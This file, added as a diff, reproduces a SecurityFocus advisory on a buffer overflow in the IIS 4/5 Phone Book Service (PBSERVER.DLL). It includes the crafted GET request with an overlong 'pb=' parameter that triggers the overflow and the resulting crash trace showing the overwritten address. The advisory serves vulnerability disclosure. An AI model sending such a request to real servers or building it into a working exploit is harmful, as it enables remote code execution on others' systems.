@@ -1,0 +1,57 @@
+source: http://www.securityfocus.com/bid/2048/info
+
+The Phone Book Service is an optional component that ships with the NT 4 Option Pack and Windows 2000. It is not installed by default.
+
+A buffer overflow vulnerability was discovered in the URL processing routines of the Phone Book Service requests on IIS 4 and IIS 5. If exploited, this vulnerability allows an attacker to execute arbitrary code and obtain a remote command shell with those privileges of the IUSR_machinename account (IIS 4) or the IWAM_machinename account (IIS 5). 
+
+The Phone Book server services requests using the Internet Information Services 5.0 with URIs such as http://hostname/pbserver/
+
+According to Microsoft's documentation a DLL (PBSERVER.DLL) is exported and the services can be used making requests with the following format:
+
+
+
+http://hostname/pbserver/pbserver.dll?osarch=&ostype=&osver=&cmver=&lcid=&pb
+ver=&pb=<STRING=db name>
+
+In the DLL checks the total lenght to ensure that request does not exceed
+1024 bytes, however it is
+possible to overflow a local variable of fixed length in the DLL by sending
+a request with
+the following form:
+
+GET /pbserver/pbserver.dll?&&&&&&pb=AAAAAA... (less than 980 chars)
+HTTP/1.0\n\n
+
+The result is an exception reported in the Event log with source WAM like
+the following:
+
+The HTTP server encountered an unhandled exception while processing the
+ISAPI Application '
++ 0x41414143
++ 0x41414139
+pbserver!HttpExtensionProc + 0x1C
+wam!DllGetClassObject + 0x808
+RPCRT4!NdrServerInitialize + 0x4DB
+RPCRT4!NdrStubCall2 + 0x586
+RPCRT4!CStdStubBuffer_Invoke + 0xC1
+ole32!StgGetIFillLockBytesOnFile + 0x116EC
+ole32!StgGetIFillLockBytesOnFile + 0x12415
+ole32!DcomChannelSetHResult + 0xDF0
+ole32!DcomChannelSetHResult + 0xD35
+ole32!StgGetIFillLockBytesOnFile + 0x122AD
+ole32!StgGetIFillLockBytesOnFile + 0x1210A
+ole32!StgGetIFillLockBytesOnFile + 0x11E22
+RPCRT4!NdrServerInitialize + 0x745
+RPCRT4!NdrServerInitialize + 0x652
+RPCRT4!NdrServerInitialize + 0x578
+RPCRT4!RpcSmDestroyClientContext + 0x9E
+RPCRT4!NdrConformantArrayFree + 0x8A5
+RPCRT4!NdrConformantArrayFree + 0x3FC
+RPCRT4!RpcBindingSetOption + 0x395
+RPCRT4!RpcBindingSetOption + 0x18E
+RPCRT4!RpcBindingSetOption + 0x4F8
+KERNEL32!CreateFileA + 0x11B
+
+For additional information specific to this message please visit the Microsoft Online Support site located at: http://www.microsoft.com/contentredirect.asp.
+
+By sending a carefully crafted HTTP request an attacker can bypass the total length check and overflow a local variable in PBSERVER.DLL allowing the execution of arbitrary code as user GUEST on the vulnerable machine. 
